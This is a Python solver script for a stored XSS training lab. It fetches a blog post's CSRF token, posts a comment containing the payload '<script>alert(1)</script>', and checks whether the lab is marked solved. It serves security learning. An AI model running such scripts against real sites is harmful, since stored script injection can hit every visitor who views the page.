# Lab: Stored XSS into HTML context with nothing encoded

import requests
import sys
from bs4 import BeautifulSoup
# For deprecating the warnings
requests.packages.urllib3.disable_warnings()

# Determine proxy details to intercept the request within the burp proxy
# requests.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip().rstrip('/')
        post_id = sys.argv[2].strip()
    except Exception:
        print("[-] Usage: %s <url> <post ID>" % sys.argv[0])
        print('[-] Example: %s www.example.com 1' % sys.argv[0])
        sys.exit(-1)


# establishing session for uniformity of token generation and usage
session = requests.session()
# retrieve csrf token from the post page so as to craft the valid request
load_page = session.get(base_url + "/post?postId=%s" % post_id)
csrf_response = load_page.text
csrf_token = []
soup = BeautifulSoup(csrf_response, features="lxml")
try:
    csrf_token = soup.find('input', {'name' : 'csrf'}).get('value')
    print("CSRF Token: %s" % csrf_token)
except Exception as e:
    print("Got unhandled exception %s" % str(e))

# craft the attack
exploit_payload = "<script>alert(1)</script>"
sample_name = 'John Hue'
sample_email = 'john@johnhue.org'
sample_website = 'http://johnhue.org'

target_url = base_url + "/post/comment"

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36'}
payload = {
    'csrf': csrf_token, 'postId':post_id, 'name': sample_name, 'email': sample_email, 
    'website': sample_website, 'comment': exploit_payload
    }
response = session.post(target_url, headers=headers, data=payload)
redirect_url = response.url

# now check whether problem got solved ???
is_solved = session.get(redirect_url)
result = []
soup = BeautifulSoup(is_solved.text, features="lxml")
result = soup.find("div", {"class" : "widgetcontainer-lab-status is-notsolved"})

if result is not None:
    print("Not Solved! :( \n")
else:
    print("Solved!!! :) \n")
